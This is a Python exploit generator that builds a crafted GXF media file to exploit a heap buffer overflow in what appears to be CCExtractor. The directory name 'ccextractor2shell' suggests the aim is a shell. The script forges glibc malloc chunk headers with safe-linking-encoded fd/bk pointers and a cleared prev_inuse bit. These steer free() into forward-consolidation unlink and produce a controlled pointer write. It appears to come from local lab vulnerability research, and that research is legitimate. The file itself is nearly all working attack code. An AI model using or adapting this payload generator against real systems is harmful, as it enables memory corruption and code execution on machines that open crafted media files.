#!/usr/bin/env python3
"""Local-only GXF generator: forge the malloc chunk metadata in overflow bytes.

Question: can attacker-chosen GXF payload bytes steer the terminal free() of
data->buffer into glibc's forward-consolidation unlink path, producing a
controlled pointer write, instead of the observed "free(): invalid next size"?

Layout facts from the pinned plain build (W3 evidence, gdb-heap-pointers.out):
  BUFSIZE = 0x200078 (2097272); chunk size = 0x200080;
  nextchunk P = data->buffer + BUFSIZE - 8;
  P->prev_size at P+0, P->size at P+8, safe-linked fd/bk at P+0x10/+0x18.
The GXF MEDIA payload is copied 1:1 to data->buffer, so payload offset ==
buffer offset. P is passed in from a GDB observation (GDB disables ASLR).

No pinned source, harness source or prior evidence is modified.
"""
import struct
import sys
from pathlib import Path

BUFSIZE = 0x200078
PIC_SIZE = 0x201000
OUT = Path(sys.argv[1] if len(sys.argv) > 1 else
           "lab/frontier/ccextractor2shell/real-build/inputs/unlink.gxf")
P = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0x55555661ca00
NEXTSIZE = 0x7f8           # forged nextchunk size; keeps nextnext header in reach
T = P + 0x100              # chosen address that holds P for unlink's fd/bk checks


def protect(pos: int, ptr: int) -> int:
    """glibc safe-linking encode."""
    return ((pos >> 12) ^ ptr) & 0xFFFFFFFFFFFFFFFF


def packet(kind: int, body: bytes) -> bytes:
    total = 16 + len(body)
    header = b"\x00\x00\x00\x00\x01" + bytes([kind]) + struct.pack(">I", total)
    return header + b"\x00\x00\x00\x00\xe1\xe2" + body


def map_packet() -> bytes:
    track = bytes([0x80 | 11, 0xC0]) + struct.pack(">H", 6)
    track += bytes([0x50, 4]) + struct.pack(">I", 6)
    body = b"\xe0\xff" + struct.pack(">H", 0) + struct.pack(">H", len(track))
    return packet(0xBC, body + track)


def main() -> None:
    payload = bytearray(b"\x41" * PIC_SIZE)
    p_off = BUFSIZE - 8

    def put(off: int, value: int, what: str) -> None:
        assert 0 <= off <= PIC_SIZE - 8, (what, off)
        payload[off:off + 8] = struct.pack("<Q", value)
        print(f"{what}: payload_off={off} value=0x{value:x}")

    put(p_off + 0x00, 0x200080, "P.prev_size (buffer chunk size)")
    put(p_off + 0x08, NEXTSIZE | 1, "P.size (forged nextchunk size)")
    put(p_off + 0x10, protect(P + 0x10, T - 0x18), "P.fd encoded -> T-0x18")
    put(p_off + 0x18, protect(P + 0x18, P - 0x18), "P.bk encoded -> P-0x18")
    put(p_off + 0x100, P, "T (holds P for both unlink checks)")
    # nextnextchunk size field: bit0 clear marks P as free (forward consolidate)
    put(p_off + NEXTSIZE + 0x08, 0x810, "nextnext.size (prev_inuse clear)")

    assert b"\x00\x00\x01" not in payload, "unexpected MPEG start code in payload"
    body = bytes([11, 0]) + struct.pack(">I", 0) + struct.pack(">I", PIC_SIZE)
    body += struct.pack(">I", 0) + b"\x00\x00"
    data = map_packet() + packet(0xBF, body + bytes(payload))
    OUT.write_bytes(data)
    print(f"{OUT} size={len(data)} P=0x{P:x} T=0x{T:x}")


if __name__ == "__main__":
    main()
